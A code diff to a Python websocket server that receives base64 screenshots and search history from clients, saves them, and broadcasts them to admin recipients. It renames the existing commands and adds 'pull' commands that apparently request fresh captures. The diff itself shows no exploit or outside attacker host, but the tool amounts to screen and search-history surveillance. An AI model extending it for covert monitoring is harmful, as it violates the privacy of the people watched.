@@ -43,7 +43,7 @@ async def handle_client(websocket):
                 payload = data.get("payload")
                 logger.info(f"Received command: {command}")
                 
-                if command == "screenshot":
+                if command == "update_screenshots":
                     # Decode Base64 payload and save it to a file
                     screenshot_data = base64.b64decode(payload)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -59,15 +59,26 @@ async def handle_client(websocket):
                         for f in os.listdir(SCREENSHOT_DIR)
                     ]
                     admin_message = {
-                        "command": "screenshot_update",
+                        "command": "update_screenshot",
                         "payload": screenshot_list,
                     }
                     await broadcast(admin_message)
 
-                elif command == "search_history":
-                    response = {"command": "search_history"}
+                elif command == "update_search_history":
+                    admin_message = {
+                        "command": "update_search_history",
+                        "payload": payload,
+                    }
                     save_search_history(payload)
-                    await broadcast({"command": "search_history"})
+                    await broadcast(admin_message)
+                
+                elif command == "pull_screenshots":
+                    response = {"command": "pull_screenshots"}
+                    await broadcast(response)
+
+                elif command == "pull_search_history":
+                    response = {"command": "pull_search_history"}
+                    await broadcast(response)
 
                 else:
                     response = {"command": "error"}
